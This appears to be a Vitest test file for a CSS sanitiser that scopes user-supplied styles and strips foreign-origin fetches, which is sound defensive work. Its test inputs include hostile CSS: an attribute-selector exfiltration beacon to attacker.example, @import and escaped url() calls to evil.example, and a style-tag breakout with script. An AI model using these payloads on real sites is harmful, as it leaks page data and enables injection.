import { describe, expect, it } from "vitest";
import {
	hasBalancedBraces,
	liveCustomCss,
	previewCustomCss,
	stripExternalFetches,
} from "../custom-css";

const ORIGINS = new Set(["https://linkden.test", "https://api.linkden.test"]);

describe("liveCustomCss", () => {
	it("renders the owner's CSS as is, but can't close the <style> element", () => {
		expect(liveCustomCss(".ld-hero{color:red}")).toBe(".ld-hero{color:red}");
		expect(liveCustomCss("a{}</style><script>x</script>")).not.toMatch(/<\/style/i);
	});

	it("caps the size", () => {
		expect(liveCustomCss("a".repeat(30_000))).toHaveLength(20_000);
	});
});

describe("previewCustomCss (admin preview)", () => {
	it("scopes every rule to the page root so it can't restyle admin controls", () => {
		const out = previewCustomCss("button{display:none}.admin-save{opacity:0}", ORIGINS);
		expect(out.startsWith("@scope (.ld-page) {")).toBe(true);
		expect(out.trimEnd().endsWith("}")).toBe(true);
	});

	it("drops beacons to foreign origins (attribute-selector exfiltration)", () => {
		const out = previewCustomCss(
			'a[href^="https://secret"]{background:url(https://attacker.example/x)}',
			ORIGINS,
		);
		expect(out).not.toContain("attacker.example");
		expect(out).toContain("background:none");
	});

	it("keeps same-origin, API and data: assets", () => {
		const css =
			".a{background:url(/api/images/banner/x.webp)}" +
			'.b{background:url("https://api.linkden.test/api/images/a.png")}' +
			".c{background:url(data:image/png;base64,AAAA)}";
		const out = previewCustomCss(css, ORIGINS);
		expect(out).toContain("url(/api/images/banner/x.webp)");
		expect(out).toContain('url("https://api.linkden.test/api/images/a.png")');
		expect(out).toContain("url(data:image/png;base64,AAAA)");
	});

	it("neutralises escaped url(), @import and string-URL functions", () => {
		const out = previewCustomCss(
			'@import "https://evil.example/x.css";.a{background:\\75 rl(https://evil.example/y)}' +
				'.b{background-image:image-set("https://evil.example/z" 1x)}' +
				"@font-face{font-family:x;src:url(//evil.example/f.woff)}",
			ORIGINS,
		);
		expect(out).not.toContain("evil.example/x.css");
		expect(out).not.toMatch(/url\(\s*https:\/\/evil/);
		expect(out).not.toMatch(/(?<![-\w])image-set\(/);
		expect(out).not.toContain("url(//evil.example");
	});

	it("refuses CSS whose braces would break out of the scope", () => {
		expect(previewCustomCss("} body{display:none", ORIGINS)).toBe("");
		expect(previewCustomCss(".a{color:red", ORIGINS)).toBe("");
		expect(previewCustomCss("a{}</style><b>", ORIGINS)).not.toMatch(/<\/style/i);
	});
});

describe("hasBalancedBraces", () => {
	it.each([
		["a{}", true],
		["a{b{}}", true],
		['a{content:"}"}', true],
		["/* } */a{}", true],
		["a{}}", false],
		["a{", false],
		['a{content:"unterminated}', false],
		["/* open comment a{}", false],
	])("%s → %s", (css, expected) => {
		expect(hasBalancedBraces(css)).toBe(expected);
	});
});

describe("stripExternalFetches", () => {
	it("invalidates a url( it can't parse instead of trusting it", () => {
		expect(stripExternalFetches("a{background:url(https://x.example/a b)}", ORIGINS)).toContain(
			"invalid-url(",
		);
	});
});
